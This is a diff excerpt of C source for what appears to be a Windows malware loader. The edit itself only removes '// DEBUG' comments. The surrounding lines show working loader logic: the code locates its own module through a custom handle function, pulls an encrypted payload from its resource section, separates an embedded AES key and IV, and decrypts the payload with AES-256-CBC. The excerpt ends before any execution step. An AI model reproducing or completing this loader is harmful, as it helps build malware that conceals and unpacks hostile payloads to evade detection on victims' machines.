@@ -199,13 +199,13 @@ int main() {
 	if ((hModule = hGetCurrentModuleHandle(&main)) == NULL) {
 #ifdef DEBUG
 		PRINTA("[!] hGetCurrentModuleHandle To Fetch Handle\n");
-#endif // DEBUG
+#endif
 	}
 
 	if (!GetResourceData(hModule, PAYLOAD, &pResourceRawData, &dwResourceDataSize)) {
 #ifdef DEBUG
 		PRINTA("[!] GetResourceData Failed To Fetch Resource Section Payload Of Id 0x%0.8X From Module 0x%p \n", PAYLOAD, hModule);
-#endif // DEBUG
+#endif
 	}
 
 	ctPayload = (PVOID)((ULONG_PTR)pResourceRawData + KEY_SIZE + IV_SIZE);
@@ -213,7 +213,7 @@ int main() {
 
 #ifdef DEBUG
 	PRINTA("[+] Payload Is At 0x%p Of Size %d \n", ctPayload, dwptPayloadSize);
-#endif // DEBUG
+#endif
 
 	_memcpy(ctAesKey, pResourceRawData, KEY_SIZE);
 	_memcpy(ctAesIv, (PVOID)((ULONG_PTR)pResourceRawData + KEY_SIZE), IV_SIZE);
@@ -237,18 +237,18 @@ int main() {
 	for (size_t i = 0; i < IV_SIZE; i++)
 		PRINTA("%02X ", ctAesIv[i]);
 	PRINTA("]\n");
-#endif // DEBUG
+#endif
 
 	AES256_CBC_init(&CtAesCtx, ctAesKey, ctAesIv);
 	if (!AES256_CBC_decrypt(&CtAesCtx, ctPayload, dwptPayloadSize, &ptPayload)) {
 #ifdef DEBUG
 		PRINTA("[!] AES256_CBC_decrypt Failed\n");
-#endif // DEBUG
+#endif
 	}
 
 #ifdef DEBUG
 	PRINTA("[+] Decrypted Payload At : 0x%p \n", ptPayload);
-#endif // DEBUG
+#endif
 
 	sSize = dwptPayloadSize;
 
